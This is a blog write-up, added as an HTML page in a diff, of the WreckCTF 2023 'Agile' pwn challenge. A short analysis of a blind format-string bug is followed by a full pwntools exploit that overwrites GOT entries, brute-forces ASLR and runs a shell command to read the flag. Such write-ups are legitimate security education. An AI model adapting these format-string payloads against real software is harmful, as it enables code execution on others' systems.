@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+
+    <title>Agile</title>
+    <meta name="description" content="">
+
+    <link rel="stylesheet" href="https://tsheinen.github.io/main.css">
+    
+    
+
+    <style>
+        
+        [data-theme="Dark"] {   
+            --background-color: #2D283E;
+            --background-alt-color: #36304B;
+            --highlight-color: #DEC1FF;
+            --highlight-color-alt: #ED254E;
+            --foreground-color: #D1D7E0;
+        }
+        
+        [data-theme="Light"] {   
+            --background-color: #E0F5CC;
+            --background-alt-color: #EAF8DD;
+            --highlight-color: #D8315B;
+            --highlight-color-alt: #0197F6;
+            --foreground-color: #3B413C;
+        }
+        
+    </style>
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.4.0/dist/confetti.browser.min.js"></script>
+    
+    
+</head>
+<body data-theme="dark">
+    <script defer>
+
+        function setTheme(theme) {
+            document.body.dataset['theme'] = theme;
+            localStorage.setItem('theme', theme);
+        }
+        window.addEventListener('storage', function(event){
+            if (event.storageArea === localStorage && event.key === "theme") {
+                setTheme(event.newValue);
+            }
+        }, false);
+        setTheme(localStorage.getItem('theme') || 'dark');
+        setTimeout(() => window.document.body.classList.add("transition"), 300);
+    </script>
+    <a class="skip-main" href="#main">Skip to content</a>
+    <div class="container">
+        <header> 
+            <h1 class="site-header">
+                <a href="https:&#x2F;&#x2F;tsheinen.github.io">Teddy Heinen</a>
+            </h1>
+            <nav>
+                
+                
+                
+                <a  href="https:&#x2F;&#x2F;tsheinen.github.io&#x2F;about&#x2F;">About</a>
+                
+                
+                <a  href="https:&#x2F;&#x2F;tsheinen.github.io&#x2F;tags&#x2F;">Tags</a>
+                
+<!--                 <div class="search-container">
+                    <input id="search" type="search" placeholder="🧐 Search!">
+
+                    <div class="search-results">
+                        <div class="search-results__items"></div>
+                    </div>
+                </div> -->
+                
+            </nav>
+        </header>
+        <main id="main" tabindex="-1">
+            
+
+
+<nav class="toc">
+  <ul>
+  
+      <li>
+        <a href="https://tsheinen.github.io/wreckctf-2023/agile/#analysis">analysis</a>
+        <ul>
+          
+        </ul>
+      </li>
+  
+      <li>
+        <a href="https://tsheinen.github.io/wreckctf-2023/agile/#solve">solve</a>
+        <ul>
+          
+        </ul>
+      </li>
+  
+  </ul>
+  <svg class="toc-marker" width="200" height="200" xmlns="http://www.w3.org/2000/svg">
+    <path stroke="#444" stroke-width="3" fill="transparent" stroke-dasharray="0, 0, 0, 1000" stroke-linecap="round" stroke-linejoin="round" transform="translate(-0.5, -0.5)" />
+  </svg>
+</nav>
+
+<article class="post">
+    <header>
+        <h1>Agile</h1>
+    </header>
+
+    <div class="content">
+        <h1 id="analysis">analysis</h1>
+<p><a href="/wreckctf-2023/chall">chall</a></p>
+<p><img src="/wreckctf-2023/agile_main.png" alt="" /></p>
+<ul>
+<li>blind format string on stack</li>
+<li>no PIE</li>
+<li>ASLR is present</li>
+</ul>
+<p>The simplest solution is just pick a fitting location and call a one_gadget :) the setvbuf call works and by rewriting <code>__stack_chk_fail</code> to <code>_start</code> we can do a partial (three byte) overwrite to set it to another location in libc with only 12 ASLR-randomized bits. about 20 minutes later there was a flag in stdout lol</p>
+<h1 id="solve">solve</h1>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="font-style:italic;color:#5c6773;">#!/usr/bin/env python3
+</span><span>
+</span><span style="color:#ffa759;">from </span><span>pwn </span><span style="color:#ffa759;">import </span><span style="color:#ffcc66;">*
+</span><span>
+</span><span>exe </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span>(</span><span style="color:#bae67e;">&quot;chall_patched&quot;</span><span>)
+</span><span>
+</span><span>context</span><span style="color:#f29e74;">.</span><span>binary </span><span style="color:#f29e74;">= </span><span>exe
+</span><span>context</span><span style="color:#f29e74;">.</span><span>cyclic_size </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">8
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">conn</span><span>():
+</span><span>    </span><span style="color:#ffa759;">if </span><span>args</span><span style="color:#f29e74;">.</span><span>REMOTE:
+</span><span>        r </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">remote</span><span>(</span><span style="color:#bae67e;">&quot;wreckctf.com&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">34426</span><span>)
+</span><span>    </span><span style="color:#ffa759;">else</span><span>:
+</span><span>        </span><span style="color:#ffa759;">if </span><span>args</span><span style="color:#f29e74;">.</span><span>GDB:
+</span><span>            r </span><span style="color:#f29e74;">= </span><span>gdb</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">debug</span><span>([exe</span><span style="color:#f29e74;">.</span><span>path]</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">gdbscript</span><span style="color:#f29e74;">=</span><span style="color:#bae67e;">&quot;b *main+142</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">c&quot;</span><span>)
+</span><span>        </span><span style="color:#ffa759;">else</span><span>:
+</span><span>            r </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">process</span><span>([exe</span><span style="color:#f29e74;">.</span><span>path])
+</span><span>
+</span><span>    </span><span style="color:#ffa759;">return </span><span>r
+</span><span>
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">main</span><span>():
+</span><span>    r </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">conn</span><span>()
+</span><span>
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># good luck pwning :)
+</span><span>
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># got[&#39;__stack_chk_fail&#39;] rewrite lsb from 0x40 to 0x1a for a ret gadget
+</span><span>
+</span><span>
+</span><span>
+</span><span>    payload_ret_main </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">flat</span><span>({
+</span><span>        </span><span style="color:#ffcc66;">0x0</span><span style="color:#ccc9c2cc;">:</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;</span><span style="color:#ffcc66;">%240c</span><span style="color:#bae67e;">%36$hhn&quot; </span><span style="color:#f29e74;">+ </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;</span><span style="color:#ffcc66;">%16c</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="font-style:italic;color:#5c6773;"># rewrite stack chk fail to _start
+</span><span>        </span><span style="color:#ffcc66;">40</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;C&quot; </span><span style="color:#f29e74;">*</span><span style="color:#ffcc66;">8</span><span style="color:#ccc9c2cc;">,
+</span><span>        </span><span style="color:#ffcc66;">0x100</span><span style="color:#f29e74;">-</span><span style="color:#ffcc66;">8</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffd580;">p64</span><span>(exe</span><span style="color:#f29e74;">.</span><span>got[</span><span style="color:#bae67e;">&#39;__stack_chk_fail&#39;</span><span>])[</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">:</span><span style="color:#ffcc66;">7</span><span>]</span><span style="color:#ccc9c2cc;">,
+</span><span>    }</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">length</span><span style="color:#f29e74;">=</span><span style="color:#ffcc66;">255</span><span>)
+</span><span>
+</span><span>
+</span><span>    
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># e7 = 231
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># ec = 236
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># f8 = 248
+</span><span>    payload_fix_setvbuf </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">flat</span><span>({
+</span><span>        </span><span style="color:#ffcc66;">0x0</span><span style="color:#ccc9c2cc;">:</span><span>[
+</span><span>            </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;</span><span style="color:#ffcc66;">%231c</span><span style="color:#bae67e;">%36$hhn&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>            </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;</span><span style="color:#ffcc66;">%5c</span><span style="color:#bae67e;">%35$hhn&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>            </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;</span><span style="color:#ffcc66;">%12c</span><span style="color:#bae67e;">%34$hhn&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>            </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;</span><span style="color:#ffcc66;">%24c</span><span style="color:#bae67e;">&quot;
+</span><span>        ]</span><span style="color:#ccc9c2cc;">,
+</span><span>        
+</span><span>        </span><span style="color:#ffcc66;">0x100</span><span style="color:#f29e74;">-</span><span style="color:#ffcc66;">24</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffd580;">p64</span><span>(exe</span><span style="color:#f29e74;">.</span><span>got[</span><span style="color:#bae67e;">&#39;setbuf&#39;</span><span>])</span><span style="color:#ccc9c2cc;">,
+</span><span>        </span><span style="color:#ffcc66;">0x100</span><span style="color:#f29e74;">-</span><span style="color:#ffcc66;">16</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffd580;">p64</span><span>(exe</span><span style="color:#f29e74;">.</span><span>got[</span><span style="color:#bae67e;">&#39;setbuf&#39;</span><span>]</span><span style="color:#f29e74;">+</span><span style="color:#ffcc66;">1</span><span>)</span><span style="color:#ccc9c2cc;">,
+</span><span>        </span><span style="color:#ffcc66;">0x100</span><span style="color:#f29e74;">-</span><span style="color:#ffcc66;">8</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffd580;">p64</span><span>(exe</span><span style="color:#f29e74;">.</span><span>got[</span><span style="color:#bae67e;">&#39;setbuf&#39;</span><span>]</span><span style="color:#f29e74;">+</span><span style="color:#ffcc66;">2</span><span>)[</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">:</span><span style="color:#ffcc66;">7</span><span>]</span><span style="color:#ccc9c2cc;">,
+</span><span>    }</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">length</span><span style="color:#f29e74;">=</span><span style="color:#ffcc66;">255</span><span>)
+</span><span>
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">send</span><span>(payload_ret_main)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">send</span><span>(payload_fix_setvbuf)
+</span><span>    time</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sleep</span><span>(</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">.</span><span style="color:#ffcc66;">1</span><span>)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;grep flag *;exit;&quot;</span><span>)
+</span><span>    </span><span style="color:#f28779;">print</span><span>(r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvall</span><span>())
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">close</span><span>()
+</span><span>
+</span><span>
+</span><span style="color:#ffa759;">if </span><span>__name__ </span><span style="color:#f29e74;">== </span><span style="color:#bae67e;">&quot;__main__&quot;</span><span>:
+</span><span>    </span><span style="color:#ffd580;">main</span><span>()
+</span><span>    </span><span style="color:#ffa759;">if </span><span>args</span><span style="color:#f29e74;">.</span><span>REMOTE:
+</span><span>        count </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0
+</span><span>        </span><span style="color:#ffa759;">while </span><span style="color:#ffcc66;">True</span><span>:
+</span><span>            </span><span style="color:#ffd580;">main</span><span>()
+</span><span>            count </span><span style="color:#f29e74;">+= </span><span style="color:#ffcc66;">1
+</span></code></pre>
+
+    </div>
+
+    
+    <div class="article-info">
+        
+        <div class="article-date">14 October 2023</div>
+        
+        <div class="article-taxonomies">
+            
+            
+                <ul class="article-tags">
+                    
+                    <li><a href="https://tsheinen.github.io/tags/pwn/">#pwn</a></li>
+                    
+                    <li><a href="https://tsheinen.github.io/tags/format-string/">#format-string</a></li>
+                    
+                    <li><a href="https://tsheinen.github.io/tags/blind-format-string/">#blind-format-string</a></li>
+                    
+                </ul>
+            
+        </div>
+    </div>
+
+</article>
+
+<script>
+window.onscroll = function() {
+    if (window.innerHeight + window.pageYOffset >= document.body.offsetHeight) {
+        var count = 200;
+        var defaults = {
+          origin: { y: 0.7 }
+        };
+
+        function fire(particleRatio, opts) {
+          confetti(Object.assign({}, defaults, opts, {
+            particleCount: Math.floor(count * particleRatio)
+          }));
+        }
+
+        fire(0.25, {
+          spread: 26,
+          startVelocity: 55,
+        });
+        fire(0.2, {
+          spread: 60,
+        });
+        fire(0.35, {
+          spread: 100,
+          decay: 0.91,
+          scalar: 0.8
+        });
+        fire(0.1, {
+          spread: 120,
+          startVelocity: 25,
+          decay: 0.92,
+          scalar: 1.2
+        });
+        fire(0.1, {
+          spread: 120,
+          startVelocity: 45,
+        });
+    }
+}
+</script>
+<script type="text/javascript" src="/js/navbar.js"></script>
+
+
+        </main>
+        <footer>
+            
+            
+        </footer>
+    </div>
+
+
+
+    <details data-popover="up" style="right: 20px;top: 20px;">
+      <summary>
+		  <svg class="paint-roller" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="paint-roller" class="svg-inline--fa fa-paint-roller fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M416 128V32c0-17.67-14.33-32-32-32H32C14.33 0 0 14.33 0 32v96c0 17.67 14.33 32 32 32h352c17.67 0 32-14.33 32-32zm32-64v128c0 17.67-14.33 32-32 32H256c-35.35 0-64 28.65-64 64v32c-17.67 0-32 14.33-32 32v128c0 17.67 14.33 32 32 32h64c17.67 0 32-14.33 32-32V352c0-17.67-14.33-32-32-32v-32h160c53.02 0 96-42.98 96-96v-64c0-35.35-28.65-64-64-64z"/></svg>
+      </summary>
+      <div class="swatch-container">
+          
+            <div class="swatch-child" onclick="setTheme('Dark')">
+                <div style="text-align: center;">
+                  <div data-theme=Dark class="swatch">
+                    <div style="height: 100%; width:25%; background-color: var(--background-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--foreground-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color-alt, #000000)"></div>
+                  </div>
+                  <span style="color:  var(--background-color, #000000)"> Dark </span>
+              </div>
+            </div>
+          
+            <div class="swatch-child" onclick="setTheme('Light')">
+                <div style="text-align: center;">
+                  <div data-theme=Light class="swatch">
+                    <div style="height: 100%; width:25%; background-color: var(--background-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--foreground-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color-alt, #000000)"></div>
+                  </div>
+                  <span style="color:  var(--background-color, #000000)"> Light </span>
+              </div>
+            </div>
+          
+      </div>
+    </details>
+
+    <!-- Cloudflare Web Analytics -->
+    <script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "1e533cda4e344b0bb7c6bf7aef70a519"}'></script>
+    <!-- End Cloudflare Web Analytics -->
+
+    <script type="text/javascript" src="https://tsheinen.github.io/elasticlunr.min.js"></script>
+    <script type="text/javascript" src="https://tsheinen.github.io/search_index.en.js"></script>
+    <script type="text/javascript" src="https://tsheinen.github.io/js/search.js"></script>
+</body>
+</html>
